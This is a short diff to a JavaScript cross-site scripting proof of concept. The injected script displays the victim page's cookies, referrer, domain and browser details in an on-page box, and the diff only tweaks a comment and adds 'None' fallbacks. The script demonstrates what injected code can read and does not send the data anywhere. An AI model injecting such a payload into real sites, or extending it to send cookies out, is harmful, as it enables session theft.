@@ -1,4 +1,4 @@
-// XSS proof of concept - Shows user browser information
+// XSS proof of concept - Shows user's browser information
 const box = document.createElement('div')
 box.innerHTML = `
 <h3 style="color: white">Browser Info</h3>
@@ -36,10 +36,10 @@ document.body.appendChild(box);
 
 // Browser information (need to add the <p> above)
 const arr = [`Base URI: ${document.baseURI}`,
-			`Cookies: ${document.cookie}`,
+			`Cookies: ${document.cookie || "None"}`,
 			//`documentURI: ${document.documentURI}`,
 			`Domain: ${document.domain}`,
-			`Referrer: ${document.referrer}`,
+			`Referrer: ${document.referrer || "None"}`,
 			`Local Date/Time: ${Date().toLocaleString()}`,
 			`User Agent: ${navigator.userAgent}`,
 			`Browser Language: ${navigator.language}`,
